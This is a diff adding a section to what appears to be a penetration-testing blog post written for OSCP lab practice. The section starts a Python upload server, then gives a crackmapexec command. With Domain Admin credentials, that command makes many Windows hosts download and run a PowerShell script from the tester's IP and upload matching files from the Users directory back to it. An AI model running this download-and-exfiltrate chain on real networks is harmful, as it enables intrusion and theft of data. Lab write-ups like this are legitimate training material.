@@ -169,4 +169,22 @@ def deal_post_data(self):
             return ('Failed',self.client_address,fn )
 ```
 
+<b>The Fun Part:</b>
+
+Start your postserver.py
+We set the ip, port, and relative upload directory. (I server files from the curent directory and upload to a sub-directory)
+
+```shell
+python3 python/postserver.py -b 0.0.0.0 -p 8443 -u uploads
+```
+This blog talks about mass exfiltration so we will assume you are like me and just have to run this once you find Domain Admin creds becasue you just want to see it happen. :)
+We will use crackmapexec to source the upload.ps1 from our server and run it. This command is looking for the proofs but in the OSCP labs i use this as an initial peek into the Users directory on Windows boxes becasue from my experience offsec likes to put the juicy there or the root of the drive.
+
+```shell
+crackmapexec smb $(cat nodes.txt) -u DomainAdminUser -p DAPassword -x 'powershell.exe -command "iex (iwr http://192.168.45.242:8443/tools/upload.ps1 -usebasicparsing);exfil -dir c:\users\ -recurse -include '*local.txt,*proof.txt' -url http://192.168.45.242:8443 "'
+```
+<b>LOOT!!!</b>
+![](images/PostServer.png?raw=true)
+
+
 
